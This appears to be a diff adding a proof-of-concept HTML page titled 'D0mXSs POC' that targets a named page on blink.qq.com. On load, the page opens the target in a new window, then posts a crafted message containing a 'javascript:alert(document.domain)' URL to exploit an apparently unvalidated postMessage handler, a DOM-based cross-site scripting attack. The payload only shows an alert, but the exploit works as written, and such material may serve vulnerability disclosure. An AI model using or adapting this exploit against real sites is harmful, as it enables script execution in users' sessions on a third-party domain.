@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>D0mXSs POC</title>
+  </head>
+  <body>
+    <h1>Hi this is a normal page !!!</h1>
+
+    <script>
+      var link = document.createElement("a");
+      link.href =
+        "https://blink.qq.com/b2bshop/index/industrySites/402065043795337216/eventShows/447197846224117760";
+
+      link.target = "_blank";
+      link.innerHTML="click here"
+      document.body.appendChild(link);
+      var win;
+      link.onclick = function () {
+        win = window.open(link.href, "_blank");
+        return false;
+      };
+
+      window.onload = () => {
+        link.click();
+        setTimeout(function () {
+          win.postMessage(msg, "*");
+        }, 6000);
+      };
+
+      let msg = {
+        action: "replace",
+        type: "logout",
+        url: "javascript:alert(document.domain)",
+      };
+
+
+ //newTab.location.href = url;
+    </script>
+  </body>
+</html>
